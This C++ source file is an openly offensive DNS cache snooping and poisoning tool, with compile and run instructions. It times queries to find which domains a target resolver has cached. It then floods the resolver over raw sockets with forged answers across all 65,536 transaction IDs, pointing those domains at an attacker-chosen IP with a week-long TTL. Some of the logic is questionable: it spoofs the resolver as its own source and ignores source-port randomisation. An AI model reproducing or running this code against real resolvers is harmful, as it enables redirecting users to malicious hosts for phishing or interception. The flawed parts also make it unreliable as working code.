// Compile: g++ -o cache_snoop cache_snoop.cpp
// Run: ./cache_snoop <target_dns> <domain_list_file> <spoof_ip>
// No root required for query phase, root for injection

#include <iostream>
#include <fstream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <vector>

class CacheSnoopingAttack {
private:
    std::string targetDNS, spoofIP;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    // Measure response time to determine if domain is cached
    long measureQueryTime(const std::string& domain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        char query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, domain);
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        auto start = std::chrono::high_resolution_clock::now();
        sendto(sock, query, pos, 0, (struct sockaddr*)&dest, sizeof(dest));
        
        char response[1024];
        recvfrom(sock, response, sizeof(response), 0, NULL, NULL);
        
        auto end = std::chrono::high_resolution_clock::now();
        close(sock);
        
        return std::chrono::duration_cast<std::chrono::microseconds>(end - start).count();
    }
    
public:
    CacheSnoopingAttack(const std::string& dns, const std::string& spoof)
        : targetDNS(dns), spoofIP(spoof) {}
    
    // Send forged response for a specific domain
    void forgeResponse(const std::string& domain) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        // Send many responses with varied TXIDs
        for (int txid = 0; txid < 65536; txid++) {
            char packet[512];
            memset(packet, 0, sizeof(packet));
            
            struct iphdr* ip = (struct iphdr*)packet;
            struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
            char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
            
            *(uint16_t*)(dns + 0) = htons(txid);
            *(uint16_t*)(dns + 2) = htons(0x8180);
            *(uint16_t*)(dns + 4) = htons(1);
            *(uint16_t*)(dns + 6) = htons(1);
            
            int pos = 12;
            pos += encodeName(dns + pos, domain);
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            
            *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // Long TTL
            *(uint16_t*)(dns + pos) = htons(4); pos += 2;
            struct in_addr addr;
            inet_aton(spoofIP.c_str(), &addr);
            memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
            
            udp->source = htons(53);
            udp->dest = htons(53);
            udp->len = htons(sizeof(struct udphdr) + pos);
            
            ip->ihl = 5;
            ip->version = 4;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = inet_addr(targetDNS.c_str());
            ip->daddr = inet_addr(targetDNS.c_str());
            
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_port = htons(53);
            dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
            
            sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        
        close(sock);
    }
    
    void run(const std::vector<std::string>& domains) {
        for (const auto& domain : domains) {
            long time = measureQueryTime(domain);
            
            // If query returned fast (< 20ms), it's cached
            if (time < 20000) {
                std::cout << "[+] Cached: " << domain << " (" << time << " us)\n";
                // Domain is cached - now poison it
                // The cached response is about to expire, force fresh lookup
                forgeResponse(domain);
            } else {
                std::cout << "[-] Not cached: " << domain << " (" << time << " us)\n";
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_dns> <domain_list_file> <spoof_ip>\n";
        return 1;
    }
    
    std::ifstream file(argv[2]);
    std::vector<std::string> domains;
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) domains.push_back(line);
    }
    
    CacheSnoopingAttack attack(argv[1], argv[3]);
    attack.run(domains);
    return 0;
}
